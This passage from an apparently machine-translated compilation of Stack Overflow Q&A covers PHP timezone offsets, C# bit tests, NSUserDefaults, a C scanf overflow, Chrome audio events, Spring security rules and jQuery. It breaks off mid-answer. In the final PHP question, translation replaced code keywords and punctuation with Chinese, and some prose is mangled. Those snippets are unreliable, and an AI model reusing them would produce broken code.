我包括了某些时区的开关/`:30`案例`:45`。可能有一种方法可以在不需要开关/外壳的情况下也包含它。

**注意：**偏移量总是按原样返回`+00:00`或`-00:00`从地理 IP API 返回。

我将不胜感激任何帮助或正确方向的观点。我对 PHP 不是很熟悉，但偏移量对我来说是一个新故事。谢谢！

* * *

## 回答 #1

> 赞同：58
> 
> 时间：2012-08-10T06:38:21.677

它可以很简单地完成，将偏移量转换为秒并将其传递给`timezone_name_from_abbr`：

```
<?php
$offset = '-7:00';

// Calculate seconds from offset
list($hours, $minutes) = explode(':', $offset);
$seconds = $hours * 60 * 60 + $minutes * 60;
// Get timezone name from seconds
$tz = timezone_name_from_abbr('', $seconds, 1);
// Workaround for bug #44780
if($tz === false) $tz = timezone_name_from_abbr('', $seconds, 0);
// Set timezone
date_default_timezone_set($tz);

echo $tz . ': ' . date('r'); 
```

[演示](http://codepad.org/6rlk8gQh)

第三个参数`timezone_name_from_abbr`控制是否调整夏令时。

[错误 #44780](https://bugs.php.net/bug.php?id=44780)：

> timezone_name_from_abbr() 将在某些时区偏移上返回 false。特别是 - 夏威夷，它的 GMT 偏移量为 -10，-36000 秒。

参考：

*   [`timezone_name_from_abbr`](http://php.net/manual/en/function.timezone-name-from-abbr.php)
*   [`date_default_timezone_set`](http://php.net/manual/en/function.date-default-timezone-set.php)
*   [`date`](http://php.net/manual/en/function.date.php)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-08T00:52:12.500

```
date_default_timezone_set('UTC');

$timezones = array();
foreach (DateTimeZone::listAbbreviations() as $key => $array)
{
    $timezones = array_merge($timezones, $array);
}

$utc                = new DateTimeZone('UTC');
$timezone_offset    = '+02:00'; # 2H
$sign               = substr($timezone_offset, 0, 1) == '+'? '': '-';
$offset             = substr($timezone_offset, 1, 2) . 'H' . substr($timezone_offset, 4, 2) . 'M';

$operation = $sign == ''? 'add': 'sub';

$start  = new DateTime('', $utc);
$date   = new DateTime('', $utc);

$date->{$operation}(new DateInterval("PT{$offset}"));

$offset = $start->diff($date)->format('%r') . ($start->diff($date)->h * 3600 + $start->diff($date)->m * 60 + $start->diff($date)->s); # 7200 (2H)

echo $offset, PHP_EOL;
echo $date->format('Y-m-d H:i:s'), PHP_EOL;

foreach($timezones as $timezone)
{
    if($timezone['offset'] == $offset)
    {
        echo $timezone['timezone_id'], PHP_EOL;
    }
} 
```

我可能在某些方面误解了你，但我希望它有所帮助，如果你能更具体，我可能会更有帮助。

对于智利，我得到：

```
-25200 (-7h)
2012-08-07 18:05:24 (current time 2012-08-08 01:05:24)
Chile/EasterIsland 
```

上面示例的输出：

```
7200
2012-08-08 02:49:56
Europe/London
Europe/Belfast
Europe/Gibraltar
Europe/Guernsey
Europe/Isle_of_Man
Europe/Jersey
GB
Africa/Khartoum
Africa/Blantyre
Africa/Bujumbura
Africa/Gaborone
Africa/Harare
Africa/Kigali
Africa/Lubumbashi
Africa/Lusaka
Africa/Maputo
Africa/Windhoek
Europe/Berlin
Africa/Algiers
Africa/Ceuta
Africa/Tripoli
Africa/Tunis
Arctic/Longyearbyen
Atlantic/Jan_Mayen
CET
Europe/Amsterdam
Europe/Andorra
Europe/Athens
Europe/Belgrade
Europe/Bratislava
Europe/Brussels
Europe/Budapest
Europe/Chisinau
Europe/Copenhagen
Europe/Gibraltar
Europe/Kaliningrad
Europe/Kiev
Europe/Lisbon
Europe/Ljubljana
Europe/Luxembourg
Europe/Madrid
Europe/Malta
Europe/Minsk
Europe/Monaco
Europe/Oslo
Europe/Paris
Europe/Podgorica
Europe/Prague
Europe/Riga
Europe/Rome
Europe/San_Marino
Europe/Sarajevo
Europe/Simferopol
Europe/Skopje
Europe/Sofia
Europe/Stockholm
Europe/Tallinn
Europe/Tirane
Europe/Tiraspol
Europe/Uzhgorod
Europe/Vaduz
Europe/Vatican
Europe/Vienna
Europe/Vilnius
Europe/Warsaw
Europe/Zagreb
Europe/Zaporozhye
Europe/Zurich
WET
Europe/Kaliningrad
Europe/Helsinki
Africa/Cairo
Africa/Tripoli
Asia/Amman
Asia/Beirut
Asia/Damascus
Asia/Gaza
Asia/Istanbul
Asia/Nicosia
EET
Europe/Athens
Europe/Bucharest
Europe/Chisinau
Europe/Istanbul
Europe/Kaliningrad
Europe/Kiev
Europe/Mariehamn
Europe/Minsk
Europe/Moscow
Europe/Nicosia
Europe/Riga
Europe/Simferopol
Europe/Sofia
Europe/Tallinn
Europe/Tiraspol
Europe/Uzhgorod
Europe/Vilnius
Europe/Warsaw
Europe/Zaporozhye
Asia/Jerusalem
Asia/Gaza
Asia/Tel_Aviv
MET
Africa/Johannesburg
Africa/Maseru
Africa/Mbabane
Africa/Windhoek
Africa/Windhoek
Africa/Ndjamena
Europe/Lisbon
Europe/Madrid
Europe/Monaco
Europe/Paris
WET
Europe/Luxembourg 
```

这确定了我的时区。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2015-04-26T11:18:40.973

```
$UTC_offset = '+03:00';
$date       = new \DateTime('now', 'UTC');
var_dump($date);
$timezone  = new \DateTimeZone(str_replace(':', '', $UTC_offset));
$date->setTimezone($timezone);
var_dump($date); 
```

结果：

```
class DateTime#205 (3) {
  public $date =>
  string(26) "2015-01-20 06:00:00.000000"
  public $timezone_type =>
  int(3)
  public $timezone =>
  string(3) "UTC"
}
class DateTime#205 (3) {
  public $date =>
  string(26) "2015-01-20 09:00:00.000000"
  public $timezone_type =>
  int(1)
  public $timezone =>
  string(6) "+03:00"
} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2017-12-04T23:13:35.697

如今，`DateTimeZone`构造函数可以显式接受 UTC 偏移量，我知道你有。

所以就：

```
$timeZone = new DateTimeZone('+0100'); 
```

文档：

[http://php.net/manual/en/datetimezone.construct.php](http://php.net/manual/en/datetimezone.construct.php)

*注意：根据该文档链接，这个新的构造函数用法自 PHP 版本 5.5.10 起可用。*

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2014-08-21T17:58:57.173

不建议将时区偏移映射回时区标识符。许多时区共享相同的偏移量。

即使在一个国家内，这也是有问题的。考虑到在美国，中部标准时间 ( `America/Chicago`) 和东部夏令时间 ( `America/New_York`) 在一年中的不同时间都使用 -5 偏移量。

还要考虑到有时这两个时区同时使用 -5。例如，UTC-5 的 2013 年 11 月 3 日星期日凌晨 1:00 可能是 CDT 或 EST。您无法仅通过 -5 来区分它是哪个时区。

[详情在这里。](http://www.timeanddate.com/worldclock/converted.html?iso=20131103T01&p1=64&p2=179)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-08-08T00:30:05.260

您可能想看看`DateTime`PHP 扩展（它在所有 PHP 版本 >= 5.2.0 中默认启用和包含，除非在编译时特别禁用它）。

它可以很好地完成您在这里需要的一切。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-08-22T09:32:19.033

您也可以使用 GMT 时间，然后将其转换为您的要求

```
<?php
echo gmdate("M d Y H:i:s", mktime(0, 0, 0, 1, 1, 1998));
?> 
```

GMT 指的是全球通用的格林威治标准时间。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2018-04-26T23:57:23.017

这对我有用：

```
function Get_Offset_Date($Offset, $Unixtime = false, $Date_Format = 'Y.m.d,H:i')
{
    try
    {
        $date   = new DateTime("now",new DateTimeZone($Offset));
        if($Unixtime)
        {
            $date->setTimestamp($Unixtime);
        }

        $Unixtime = $date->getTimestamp();
        return $date->format($Date_Format);
    }

    catch(Exception $e)
    {
        return false;
    }
} 
```

要使用它，只需调用它来获取当前时间：

```
echo Get_Offset_Date('+2:00'); 
```

这用于获取偏移日期（输入是 unixtime）

```
echo Get_Offset_Date('+2:00',1524783867); 
```

# c# - C# 中 BigInteger 的二进制/位操作

> ID：11820721
> 
> 赞同：1
> 
> 时间：2012-08-05T22:47:29.927
> 
> 标签：c#, .net, binary, bit-manipulation, biginteger

以下代码检查给定数字是否遵循特定的二进制模式。

我编写此代码时没有考虑字节序以及数字的签名方式。

```
public static bool IsDiagonalToPowerOfTwo (this System.Numerics.BigInteger number)
{
    byte [] bytes = null;
    bool moreOnesPossible = true;

    if (number == 0) // 00000000
    {
        return (true); // All bits are zero.
    }
    else
    {
        bytes = number.ToByteArray();

        if ((bytes [bytes.Length - 1] & 1) == 1)
        {
            return (false);
        }
        else
        {
            for (byte b=0; b < bytes.Length; b++)
            {
                if (moreOnesPossible)
                {
                    if (bytes [b] == 255)
                    {
                        // Continue.
                    }
                    else if
                    (
                        ((bytes [b] & 128) == 128) // 10000000
                        || ((bytes [b] & 192) == 192) // 11000000
                        || ((bytes [b] & 224) == 224) // 11100000
                        || ((bytes [b] & 240) == 240) // 11110000
                        || ((bytes [b] & 248) == 248) // 11111000
                        || ((bytes [b] & 252) == 252) // 11111100
                        || ((bytes [b] & 254) == 254) // 11111110
                    )
                    {
                        moreOnesPossible = false;
                    }
                    else
                    {
                        return (false);
                    }
                }
                else
                {
                    if (bytes [b] > 0)
                    {
                        return (false);
                    }
                }
            }
        }
    }

    return (true);
} 
```

我如何调整此代码以适应小端顺序和符号？我曾尝试关注**[MSDN](http://msdn.microsoft.com/en-us/library/system.numerics.biginteger.tobytearray.aspx)**，但没有运气。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:09:48.300

考试

```
else if
        (
            ((bytes [b] & 128) == 128) // 10000000
            || ((bytes [b] & 192) == 192) // 11000000
            || ((bytes [b] & 224) == 224) // 11100000
            || ((bytes [b] & 240) == 240) // 11110000
            || ((bytes [b] & 248) == 248) // 11111000
            || ((bytes [b] & 252) == 252) // 11111100
            || ((bytes [b] & 254) == 254) // 11111110
        ) 
```

可以简化为`else if ((bytes[b] & 128) == 128)`。后面的任何测试都意味着第一个测试，因此已经完全确定了结果。我想你真正想要的是

```
else if (bytes[b] == 128
         || bytes[b] == 192
         || bytes[b] == 224
         || bytes[b] == 240
         || bytes[b] == 248
         || bytes[b] == 252
         || bytes[b] == 254
        ) 
```

除此之外，表示是固定的，`ToByteArray`无论机器字节序如何，都给出相同的表示。

# objective-c - NSUserDefaults 和存储值

> ID：11820723
> 
> 赞同：1
> 
> 时间：2012-08-05T22:47:54.747
> 
> 标签：objective-c, xcode, nsmutablearray, nsuserdefaults

您好我正在尝试将数组存储到 NSUserDefaults 但我遇到了麻烦。该方法接受一个 NSDictionary，我将其存储到一个数组中，该数组将存储到 NSUSerDefaults 中。问题是当我制作 mutableCopy 时，它说它是字典而不是 NSMutable 数组类型？这种方法是我第一次调用 NSUserDefaults 所以我不确定为什么会发生错误？这是代码谢谢

```
+(void) getRecentPhoto:(NSDictionary *)recentPhoto{

NSUserDefaults* defaults = [NSUserDefaults standardUserDefaults];
 //stores it as a dictionary? error happens here
NSMutableArray* recentPhotos = [[defaults objectForKey:@"recentPhoto"] mutableCopy];
NSLog(@"%@", [recentPhotos class]);
if(!recentPhotos) recentPhotos = [NSMutableArray array];
BOOL copy = NO;

//these will crash the program
NSLog(@"%@", [[recentPhotos objectAtIndex:0] objectForKey:@"id"]);
NSLog(@"%@", [recentPhoto objectForKey:@"id"]);

 //this checks if it has been stored before by using an id key
for(int i =0; i < [recentPhotos count]; i++){

    if ([[[recentPhotos objectAtIndex:i] objectForKey:@"id"] isEqualToString:[recentPhoto objectForKey:@"id"]] ) {
        copy = YES;
    }
}
if(copy ==NO)
[recentPhotos addObject:recentPhoto];
[defaults setObject:recentPhoto forKey:@"recentPhoto"];
[defaults synchronize];

} 
```

这是错误

```
 NSInvalidArgumentException', reason: '-[__NSCFDictionary objectAtIndex:]: unrecognized selector 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T23:09:06.237

我相信问题在于，在此方法的最后，您尝试将`recentPhoto`作为字典的 存储到用户默认值而不是`recentPhotos`要存储的可变数组中。

实际上，我认为它不会在第一次调用此方法时崩溃，因为`recentPhoto`尚未存储在用户默认值中。但在那之后，它会的。

# java - 如何使java中的用户输入为double类型？

> ID：11820727
> 
> 赞同：0
> 
> 时间：2012-08-05T22:48:22.553
> 
> 标签：java

这一行：

```
arr[i] = sc.nextDouble(); 
```

从此代码：

```
public class z01 { 
  public static void main(String[] args) { 
    @SuppressWarnings("resource") 
    Scanner sc = new Scanner(System.in); 
    System.out.println("Enter array size: "); 
    int n = sc.nextInt(); 
    double[] arr = new double[n]; 
    double min = 0; 
    for(double i = 0; i <n; i++){ 
      System.out.println("Enter element " + (i + 1)); 
      arr[i] = sc.nextDouble(); 
      if(i%3 == 0 && i <= min){ 
        min = i; 
      } 
    } 
    if(min != 0){ 
      System.out.println("The smallest number divisible by 3 is" + min); 
    } else { 
      System.out.println("No number is divisible by 3"); 
    } 
  } 
} 
```

给出这个警告：

```
Type mismatch: cannot convert from double to int 
```

如何使 java 中的用户输入为 double 类型？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T22:53:18.627

~~Your problem here is probably that the array arr is of type int. That is why you get that error. Define arr as follows and try again (where x the desired dimension):~~

 ~~```
double arr[] = new double[x]; 
```~~  ~~The problem is that you have set `i` in the for loop to be of type `double` while it should be of type `int`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T22:54:30.297

One method is to use a try catch exception.

```
try {
     double var = sc.nextDouble();
} 
catch(TypeMismatchException ex) {
     System.err.println("try again, wrong type");
} 
```

basically, if there is an error storing the value in a double, it'll execute the catch statement, and you can prompt the user again for more input.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-06T10:33:09.867

我注意到您的代码中有以下错误：

*   当您`double i`在数组索引中读取`int n`. 这就是您的类型不匹配错误的来源。由于数组索引必须是 type `int`，因此`arr[i]`您尝试传递`arr[double]`仅`arr[int]`支持 where 的位置。

*   如果您希望使用新的最小值重新分配它，则需要从开始，除非您输入的所有值都是负数`min`。`Double.MAX_VALUE`一定要相应地改变你的`if (min != 0) {`。~~

# android - Actionscript 3 - Android 应用程序不更新内容。在记忆中保持旧？

> ID：11820730
> 
> 赞同：0
> 
> 时间：2012-08-05T22:49:00.300
> 
> 标签：android, actionscript-3

我编写了以下代码 (AS3)，它加载 XLM 文件，获取星期几，然后在舞台上显示相应的问题。

当我在 Flash 中测试时，它在我的计算机上运行良好。但在我的 Galaxy S2 上，它只显示安装当天的问题，并且不会每天更新一个新问题。

我在这里想念什么？提前致谢。

这是 XML：

```
<?xml version="1.0" encoding="UTF-8"?>
<questions7>
    <question day="0"><![CDATA[Question for Sunday ]]></question>
    <question day="1"><![CDATA[Question for Monday ]]></question>
    <question day="2"><![CDATA[Question for Tuesday ]]></question>
    <question day="3"><![CDATA[Question for Wednesday ]]></question>
    <question day="4"><![CDATA[Question for Thursday ]]></question>
    <question day="5"><![CDATA[Question for Friday ]]></question>
    <question day="6"><![CDATA[Question for Saturday ]]></question>
</questions7> 
```

和动作脚本：

```
//Loads external XML file
var myXML:XML;
var myLoader:URLLoader = new URLLoader();
myLoader.load(new URLRequest("questions7.xml"));
myLoader.addEventListener(Event.COMPLETE, processXML);

// Get day number of the week
var myDateDay:Date = new Date();
var dayNumber:int = myDateDay.day;

//To display question of the day
function processXML(e:Event):void {
    myXML = new XML(e.target.data);
    var question:XMLList = myXML.question.(@day == dayNumber);
        trace(question);

    var myText1:TextField = new TextField();
        myText1.text = question;
        myText1.autoSize = TextFieldAutoSize.CENTER;
        myText1.border = false;
        myText1.width = stage.stageWidth - 100;
        myText1.multiline = true;
        myText1.wordWrap = true;
        myText1.y = 200;
        myText1.x = 50; 

    // Add to stage
    addChild(myText1);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-05T12:42:48.177

您可以监听 deactivate 事件，并关闭您的应用程序，这样您的应用程序将从新数据开始

```
 stage.addEventListener(Event.DEACTIVATE, deactivate);

    private function deactivate(e:Event):void 
    {
        // auto-close
        NativeApplication.nativeApplication.exit();
    } 
```

您的代码也是无效的，因为它假定运行以显示新的 qod，如果您要修改它，因此每当应用程序启动时它会加载并解析 XML（持有对 laoded XML 的引用或创建问题向量，然后在每次激活时您可以检查今天是什么日子并更新文本字段。最好让您的应用程序打开一次然后从后台带入，而不是每次用户离开时杀死它，例如拿起电话。为此，您将使用激活/停用侦听器并适当地执行 puase/resume(update) 动作。

[像这儿](http://forum.starling-framework.org/topic/resuming-using-eventactivate)

此致

# spring-security - 使用 CUD 但不是 R 的 Spring roo 安全设置？

> ID：11820732
> 
> 赞同：2
> 
> 时间：2012-08-05T22:49:11.720
> 
> 标签：spring-security, spring-roo

我正在尝试在 Spring 中设置安全策略，以便任何人都可以读取在 roo 中创建的任何实体，但只有管理员用户（在 中指定`applicationContext-security.xml`）可以创建/更新/删除。在我看来，我应该能够通过定制来实现我的目标，`applicationContext-security.xml`但我想不出办法。我想过使用拦截网址，如：

```
<intercept-url pattern="/anyEntity/*?form" access="hasRole('ROLE_ADMIN')" /> 
```

但此配置不包括 DELETE，因为它是 POST 中的隐藏字段（根据文档，支持 post 方法，但没有关于如何在拦截 url 标记中指定隐藏字段值的文档）

另一种方法是在实体设置方法上使用@secured。我目前依靠 roo 来生成 getter/setter，所以我想尽可能避免使用它

我还可以编写一个自定义控制器来进行我想的过滤。但在我看来，我应该能够自定义配置。我一定遗漏了一些明显的东西，因为公共只读策略应该是一种非常常见的策略。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T16:19:12.207

我认为您可以使用 method="DELETE" 属性来拦截 URL，因为 roo 将隐藏的方法字段转换为 http 方法。

[这里](http://forum.springsource.org/showthread.php?104113-How-to-secure-just-some-of-the-scaffolded-controller-methods)还有一些更多信息

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-02T09:49:00.060

这是我的做法：

```
 <!-- only user role can use modify methods -->
    <intercept-url pattern="/**" method="POST" access="hasRole('ROLE_USER')" />
    <intercept-url pattern="/**" method="DELETE" access="hasRole('ROLE_USER')" />
    <intercept-url pattern="/**" method="PUT" access="hasRole('ROLE_USER')" />
    <!-- any role can use GET methods -->
    <intercept-url pattern="/**" method="GET" access="isAuthenticated()" />
    <intercept-url pattern="/**" method="HEAD" access="isAuthenticated()" />
    <intercept-url pattern="/**" method="OPTIONS" access="isAuthenticated()" />
    <intercept-url pattern="/**" method="TRACE" access="isAuthenticated()" /> 
```

# c - c中的简单if语句不起作用

> ID：11820733
> 
> 赞同：1
> 
> 时间：2012-08-05T22:49:13.767
> 
> 标签：c, if-statement

谁能告诉我为什么这段代码会崩溃？很简单，如果字符串的长度> 16，再请求一个字符串。如果我在 if 语句中写 control = 1 它可以工作，但是没有它它应该可以工作，因为此时 control 的值是 1，对吗？比（我正在学习）

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int
main(void)
{
    int control = 1;
    char word[16] ;
    printf("Enter a word: ");

    while(control == 1)
    {
        scanf("%s", word);

        int len = strlen(word);
        printf("Lenght is: %d\n", len);

        if (len >= 16) 
        {
            printf("Word lenght to long, enter a new one: ");
        }

        else
        {
            control = 0;
        }

    }
    printf("This is the word: %s\n", word );

} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-05T22:51:58.637

char word[16] 为字符串分配 16 个字节的存储空间。

scanf() 然后将一个字符串读入该存储区。

如果您读入的存储量超过了分配的存储量，则存储结束后内存会损坏。

这就是你崩溃的原因。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-05T22:55:41.910

The problem is that if the user types more than the 15 characters which you have allocated space for, then the computer will merrily write all of them in memory past the end of your array. This will result in "undefined behavior" including crashing your program.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T23:25:30.427

正如其他人所指出的，您的基本问题是您正在`16`为字符串分配字符，并且很`scanf`乐意允许您将这些`16`字符写入不属于您的内存中。

请注意，C 将允许您通常对数组执行此操作，并了解标准 C 字符串的工作原理：您需要对它们进行*空终止*，这意味着您总是需要在数组中为空终止字符留出额外的空间`\0`。

有**一种**方法可以限制`scanf`C 字符串，使用带有 的*字段宽度*说明符`%s`，如下所示：

```
char input[17];  // room for 16 characters plus null-terminator

// here scanf will stop after reading 16 characters:
scanf("%16s", input); 
```

使用此代码，您可以安全地使用`scanf`不超过`16`字符的字符串填充字符串，并`scanf`为您终止字符串。

但正如其他人也指出的那样，`scanf`它在处理用户输入方面非常糟糕。通常最好`fgets`逐个使用和管理输入字符串。

# google-chrome - Chrome 中的音频元素错误：没有“结束”事件和负时间已过

> ID：11820738
> 
> 赞同：2
> 
> 时间：2012-08-05T22:50:04.617
> 
> 标签：google-chrome, html5-audio

我有以下 HTML 和 JS：

```
<script>
  function onEnded(ev) {
    window.location.reload();
  }
</script>

<audio id="audio-element" controls autoplay onended="onEnded();">
  <source src="/stream/3" type="audio/mp3" />
</audio> 
```

对于某些 MP3 流，这非常有效；播放开始，并在音轨结束时`onEnded`调用。对于其他人，播放开始正常并播放音频文件，但在结束时，经过的时间计数器变得非常负，`ended`事件永远不会触发并`audio_element.ended`返回`false`。这是一个屏幕截图：

![Chrome 音频播放器错误](../Images/250dcf75dce9759e81ae47a08a3d100a.png)

这发生在 Chrome 中，但不是 Safari 或 Firefox，它们的行为与预期相同。知道我可以在 Chrome 中做什么来使`ended`事件触发吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-15T15:47:41.553

您必须确保您的服务器接受范围传输，否则 chrome 将无法正确评估时间，因此不会触发“结束”事件。

您可以通过以下方式检查：

```
 curl --head -X GET http://yourmp3location 
```

如果你看到：

```
 Accept-Ranges: bytes 
```

然后就可以了，否则修复你的服务器

另外，你试过这个吗？

```
<audio id="audio-element" controls autoplay onended="onEnded"> 
```

我已经更改了 onended 属性，以便浏览器在呈现您的页面时不会评估 onended 函数。

您还可以删除标签音频的 onended 属性并将其添加到页面底部：

```
<script type="text/javascript">
   document.getElementById("audio-element").addEventListener('ended', function(ev) {
       window.location.reload();
   }, false);
</script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-02-21T20:55:06.500

我们在 Chrome 上遇到了一个非常相似的问题——这个浏览器在新的 Chrome 64（和 beta 65、canary 66）中不会发出 onended 事件，但是当我们用流重建 MP3 时，这个问题就消失了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-08T18:18:27.947

在尝试处理移动 Chrome 上的音频结尾时，我遇到了类似的问题：当我通过 javascript（通过 GWT）创建音频元素时，onended 事件永远不会为我触发。但是我能够开始工作：我的问题是它没有附加到 DOM（如果我正确理解结构的话），而是漂浮在 javascript 边缘。一旦我将元素设置为 display: none 并将其添加到页面元素，我的 onended 处理程序就可以正常工作。

tl;博士
如果您的元素没有直接附加到 DOM 元素，请尝试隐藏它并附加它（实际上是在任何地方）。

# java-ee-6 - Java EE 6 的基于 Web 的相册管理器

> ID：11820745
> 
> 赞同：0
> 
> 时间：2012-08-05T22:51:11.897
> 
> 标签：java-ee-6

有没有类似于[基于 Web 的相册管理器 Gallery 的](http://gallery.menalto.com/)东西，但适用于 Java EE 6？我一直在使用它，但现在我已经迁移到 Java EE 6。我需要编写自己的专辑管理器吗？

# c++ - 在 Windows 上使用 c++ 打开和关闭应用程序

> ID：11820750
> 
> 赞同：0
> 
> 时间：2012-08-05T22:51:45.437
> 
> 标签：c++, windows

我想做一个程序，打开一个 Windows 资源管理器窗口，等待 5 秒，然后关闭窗口。我尝试了以下方法：

```
#include "stdafx.h"
#include <windows.h>
#include <string>
#include <sstream>
#include <iostream>
using namespace std;

void _tmain( int argc, TCHAR *argv[] ) {

  STARTUPINFO si;
  PROCESS_INFORMATION pi;

  ZeroMemory( &si, sizeof(si) );
  si.cb = sizeof(si);
  ZeroMemory( &pi, sizeof(pi) );

  if( argc != 2 ) {
    cout << "Usage: " << argv[0] << "<path>";
    return;
  }

  // Build the command string.
  wstring app = L"explorer.exe ";
  wstring str_command = app + argv[1];
  wchar_t* command = const_cast<wchar_t*>( str_command.c_str() );

  // Open the window. 
  if( !CreateProcess( NULL,   // No module name (use command line)
      command,        // Command line
      NULL,           // Process handle not inheritable
      NULL,           // Thread handle not inheritable
      FALSE,          // Set handle inheritance to FALSE
      0,              // No creation flags
      NULL,           // Use parent's environment block
      NULL,           // Use parent's starting directory 
      &si,            // Pointer to STARTUPINFO structure
      &pi )           // Pointer to PROCESS_INFORMATION structure
  ) {
    cout << "CreateProcess failed: " << GetLastError();
    return;
  }

  cout  <<  "Opened window!" << endl;

  // Wait for it.
  Sleep(5000);

  cout  <<  "Done waiting. Closing... ";

  // Close explorer.
  HANDLE explorer = OpenProcess(PROCESS_TERMINATE, false, pi.dwProcessId);
  if( !explorer ) {
    cout << "OpenProcess failed: " << GetLastError();
    return;
  }
  if( !TerminateProcess( explorer, 0 ) ) {
    cout << "TerminateProcess failed: " << GetLastError();
    return;
  }

  // Close process and thread handles. 
  CloseHandle( explorer );
  CloseHandle( pi.hProcess );
  CloseHandle( pi.hThread );

  cout  <<  "Done.";
} 
```

我让它打开得很好，但我不能让它关闭。TerminateProcess 失败，错误代码为 5。我还尝试将 WM_CLOSE 消息发布到窗口。我从中获得了成功的价值，但窗口保持打开状态。

请帮忙！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-11-08T11:51:48.230

我找到了这个帖子： [关闭所有浏览器窗口？](https://stackoverflow.com/questions/11614292/close-all-browser-windows)

它说：

使用 InternetExplorer 对象打开每个窗口并在完成后调用 Quit 方法。这具有仅关闭您打开的窗口的额外好处（这样用户或其他应用程序打开的窗口不受影响）。

[https://msdn.microsoft.com/library/aa752127.aspx](https://msdn.microsoft.com/library/aa752127.aspx)

我知道这没有多大帮助（缺少片段），但至少有一些帮助。

# android - AsyncQueryHandler vs IntentService?

> ID：11820755
> 
> 赞同：3
> 
> 时间：2012-08-05T22:52:22.120
> 
> 标签：android, multithreading, cursor, intentservice

Looking at the source code for the stock Calendar app, Google uses an IntentService to do the content provider operations for the database. Is there an advantage to using an IntentService rather than a AsyncQueryHandler?

I thought that since a Handler is tied to the UI, if the activity gets paused or stopped, the Handler would also get paused. However, this doesn't seem to be the case: I created a simple content provider and AsyncQueryHandler that do nothing but run through a long for loop. When I launch other apps or kill the activity, the for loop still runs.

So is the advantage of using an IntentService for asynchronous CRUD operations that the service (being a service) has less of a chance of getting killed?

Update: Part of my confusion is how a handler relates to an activity's lifecycle. From my experiment, it seems that it's independent.

Also, for those not familiar with the stock Calendar app source code, the way it works is that to do a CRUD, it adds the operation to a queue along with a reference to a handler. Then it starts the intent service which pops the queue and does the CRUD. When it's finished, it invokes the handler via Message.sendToTarget().

So what does that extra complexity buy us?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:35:08.393

我陷入了同样的困惑。我发现 IntentService 将被该活动杀死。这也意味着它将在方向更改时被杀死。虽然 AsyncQueryHandler 将继续运行（如您所见）。在我的用例中，我首先更新我的 UI，而不是等待数据库更新。所以我想我会选择 AsyncQueryHandler。

我对 Intent Service 了解不多（从未使用过），但因为它正在发送消息，当您需要数据库中的某些内容在 UI 线程上显示时，它可能很有用..这样您就知道数据库何时更新。

# jquery - 从 ajax 脚本中的按钮添加和删除类

> ID：11820756
> 
> 赞同：1
> 
> 时间：2012-08-05T22:52:21.140
> 
> 标签：jquery, ajax, class, function, click

我有以下 jQuery/ajax 脚本：

```
jQuery("input.button").click(function(){
   jQuery.ajax({       
      url: 'addfav.php',
      type: 'POST',
      data: {'id':jQuery(this).closest("div").attr("id"),is_ajax: 1},
      success: function(html) {
        jQuery(this).removeClass('before');
        jQuery(this).addClass('after');
        jQuery(this).attr('disabled', 'disabled');
      }, 
      error: function() {
        jQuery('#error').html('<div>Error! Unable to add food item.</div>');
      }
    });
}); 
```

哪个处理点击这些按钮：

```
<div id="32"><input type="button" class="button before"/></div>
<div id="33"><input type="button" class="button before"/></div> 
```

但是，添加和删除类到任何一个但被单击的对象都不起作用。它适用于具有 ID 的单个按钮，即：

```
jQuery("input#button1").click(function(){ 
```

但不是当我使用类时。当我只为按钮使用类时，我需要进行哪些更改才能让此脚本向单击的任何按钮添加或删除类？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:56:31.397

您应该缓存选择器，尝试以下操作：

```
jQuery("input.button").click(function(){
   var $this = $(this);
   jQuery.ajax({       
      url: 'addfav.php',
      type: 'POST',
      data: {'id': $this.closest("div").attr("id"),is_ajax: 1},
      success: function(html) {
        $this.removeClass('before');
        $this.addClass('after');
        $this.attr('disabled', 'disabled');
      }, 
      error: function() {
        jQuery('#error').html('<div>Error! Unable to add food item.</div>');
      }
    });
}); 
```

# php - 如何将硬编码数组数据定义为 PHP 框架的一部分？

> ID：11820763
> 
> 赞同：3
> 
> 时间：2012-08-05T22:53:31.160
> 
> 标签：php, frameworks

例如50个美国。现在我只在一个函数中使用 50 个状态：

```
函数 getStateInput() {
    $states = array('AL' => '阿拉巴马', 'AK' => '阿拉斯加',
        'AZ' => '亚利桑那'等）；

    //使用$states
}
```

或者，您可以`$states`在自己的 states.php 中定义，然后像这样使用它：

```
函数 getStateInput() {
    包括（'states.php'）；

    //使用$states
}
```

但出于某种原因，这让我感到害怕，因为我使用包含来定义局部函数变量。另一种方法是将 states 数组分配给 states.php 中的超全局变量（例如，我可以使用`$_ENV['states']`）。然后我可以去：

```
包括（'states.php'）；

函数 getStateInput() {
    //使用 $_ENV['states']
}
```

是其中一个最好的还是有另一种更好的方法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-05T22:59:20.083

常见的方法是分离关注点。你可以例如。拥有自己的类与地址相关的方法。此类将是存储有关可能状态的信息的自然场所，例如：

```
class Address {
    static STATES = array(
        'AL' => 'Alabama',
        'AK' => 'Alaska',
        'AZ' => 'Arizona',
        // ...
    );
}

// and then you can use it somewhere like that:
echo Address::$STATES['AL']; 
```

* * *

## 回答 #2

> 赞同：1
> 
